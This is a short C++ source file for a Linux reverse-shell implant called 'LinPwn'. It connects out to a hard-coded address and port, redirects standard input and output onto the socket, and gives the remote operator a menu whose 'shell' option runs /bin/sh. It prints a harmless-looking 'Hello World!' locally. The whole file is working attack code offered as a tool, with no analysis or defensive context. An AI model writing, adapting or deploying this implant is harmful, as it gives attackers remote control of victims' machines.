// Copyright 2019 <Andromeda>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>

#define BUFFER 20
#define FD 0

void get_input(char *option) {
  write(FD, "\x1b[31m>>> \0", 10);
  fgets(option, 20, stdin);

  for (unsigned int i = 0; i <= strnlen(option, BUFFER); i++) {
    if (option[i] == '\n') {
        option[i] = '\0';
    }
  }
}


class Connection {
  const char *ip = "192.168.1.165";
  const int port = 8000;
  struct sockaddr_in address;

 public:
  void connection_open() {
    const int connecting = socket(AF_INET, SOCK_STREAM, 0);;
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr(ip);
    address.sin_port = htons(port);
    connect(connecting, (struct sockaddr *)&address, sizeof(address));
    dup2(connecting, FD);
    dup2(connecting, 1);
  }
};


struct Commands {
  void help() {
    write(FD, "\x1b[32mOptions: \n\0", 15);
    write(FD, "1. shell\n\0", 10);
    write(FD, "2. exit\n\0", 10);
  }


  void shell() {
    write(FD, "\x1b[32mExecuting /bin/sh\n\0", 25);
    system("/bin/sh");
  }


  void quit() {
    write(FD, "\x1b[33mClosing connection...\n\0", 28);
  }
};


int handler() {
  Commands commands;
  char option[BUFFER];
  get_input(option);

  if (strncmp(option, "shell", 5) == 0) {
    commands.shell();
  } else if (strncmp(option, "help", 4) == 0) {
    commands.help();
  } else if (strncmp(option, "exit", 4) == 0) {
    commands.quit();
    return 1;
  } else if (strncmp(option, "", 1) == 0) {
    return 0;
  } else {
    write(FD, "\x1b[33mNot a valid option\n\0", 25);
  }

  return 0;
}


int main() {
  Connection connection;
  connection.connection_open();
  write(2, "\x1b[32mHello World!\n\0", 20);
  write(FD, "\x1b[32mLinPwn\nCreated By Andromeda.\n\0", 35);
  write(FD, "Type help to list commands.\n\0", 28);

  for (;;) {
    if (handler() == 1) break;
  }

  return 0;
}
